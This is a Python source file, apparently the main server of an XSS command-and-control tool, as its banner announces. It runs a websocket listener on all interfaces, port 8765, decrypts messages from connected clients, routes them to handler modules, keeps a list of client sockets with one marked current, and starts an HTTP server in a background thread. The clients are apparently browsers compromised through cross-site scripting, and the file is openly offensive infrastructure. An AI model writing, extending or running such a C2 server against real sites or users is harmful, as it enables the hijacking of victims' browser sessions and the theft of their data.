#!/usr/bin/env python

import asyncio
import sys
import json
import threading
from websockets import server, exceptions, WebSocketServerProtocol
from modules import getModules
from cryptoUtil import decrypt
import socksUtil
import server.server as httpServer

modules, defaultModule = getModules.getModules()
host = "0.0.0.0"
introString = """

____ ____ ____ _  _ ____ ____ 
[__  |  | |     \/  [__  [__  
___] |__| |___ _/\_ ___] ___] 
                              

XSS Comand and control"""


async def exec(websocket):
    print("Conected")
    socksUtil.addSocket(websocket)
    try:
        while True:
            msg_enc = await websocket.recv()
            message_from_client = json.loads(decrypt(msg_enc))
            handler = modules[defaultModule]
            if message_from_client["type"] in modules:
                handler = modules[message_from_client["type"]]
            if "msg" in message_from_client:
                await handler.handleMessage(websocket, message_from_client["msg"])
            else:
                await handler.handleMessage(websocket, {"msg": "OK"})
    except exceptions.ConnectionClosed:
        print("Closed by client")
        if socksUtil.sockets.index(websocket) == socksUtil.current:
            socksUtil.current = 0
        socksUtil.removeSocket(websocket)


async def main():
    # Iniciar el servidor http en un hilo separado
    thread = threading.Thread(target=httpServer.main)
    thread.daemon = True
    thread.start()
    async with server.serve(exec, host, 8765, klass=MyProtocol):
        await asyncio.Future()  # run forever


class MyProtocol(WebSocketServerProtocol):
    def connection_made(self, transport):
        super().connection_made(transport)
        self.remote_ip = transport.get_extra_info('peername')[0]


if __name__ == "__main__":

    if "-q" not in sys.argv:
        print(introString)
    asyncio.run(main())
